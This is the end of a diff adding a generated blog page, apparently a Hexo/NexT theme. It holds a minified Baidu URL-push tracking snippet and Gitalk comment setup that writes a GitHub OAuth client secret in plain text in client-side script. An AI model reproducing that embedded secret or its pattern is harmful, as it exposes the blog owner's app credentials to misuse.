+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'a040036b8e5ab6a9838d',
+      clientSecret: '7b9006697fe7a78e56f22a025caf2deb03e14ea8',
+      repo        : 'BlogComment',
+      owner       : 'SakuraiHimeki',
+      admin       : ['SakuraiHimeki'],
+      id          : 'db71f6a8ec99a900442b3130142a86c2',
+        language: '',
+      distractionFreeMode: false
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
